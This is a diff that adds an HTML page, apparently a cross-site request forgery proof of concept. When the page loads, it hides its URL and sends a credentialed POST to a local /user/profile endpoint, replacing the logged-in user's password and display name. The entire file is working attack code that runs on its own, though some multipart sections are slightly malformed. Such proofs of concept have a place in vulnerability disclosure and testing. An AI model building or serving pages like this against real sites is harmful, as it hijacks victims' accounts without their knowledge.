@@ -1,0 +1,38 @@
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http:\/\/127.0.0.1:8001\/user\/profile", true);
+        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,*\/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------3500001668890290322352779091");
+        xhr.withCredentials = true;
+        var body = "-----------------------------3500001668890290322352779091\r\n" + 
+          "Content-Disposition: form-data; name=\"displayname\"\r\n" + 
+          "\r\n" + 
+          "Test\r\n" + 
+          "-----------------------------3500001668890290322352779091\r\n" + 
+          "Content-Disposition: form-data; name=\"password\"\r\n" + 
+          "\r\n" + 
+          "NEW-PASSWORD\r\n" + 
+          "-----------------------------3500001668890290322352779091\r\n" + 
+          "Content-Disposition: form-data; name=\"bio\"\r\n" + 
+          "-----------------------------3500001668890290322352779091\r\n" + 
+          "Content-Disposition: form-data; name=\"avatar\"; filename=\"\"\r\n" + 
+          "Content-Type: application/octet-stream\r\n" + 
+          "-----------------------------3500001668890290322352779091\r\n" + 
+          "Content-Disposition: form-data; name=\"Update\"\r\n" + 
+          "Update\r\n" + 
+          "-----------------------------3500001668890290322352779091--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+      submitRequest();
+    </script>
+  </body>
+</html>
